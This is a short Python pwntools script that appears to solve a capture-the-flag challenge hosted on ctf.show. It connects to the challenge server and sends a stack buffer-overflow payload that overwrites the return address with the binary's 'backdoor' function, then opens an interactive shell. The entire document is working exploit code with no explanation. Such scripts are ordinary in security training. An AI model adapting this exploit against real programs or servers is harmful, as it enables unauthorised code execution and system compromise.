from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28187)
elf = ELF('pwn')
backdoor = elf.sym['backdoor']
payload = 'A'*(0x12+4) + p32(backdoor)
io.sendline(payload)
io.recv()
io.interactive()
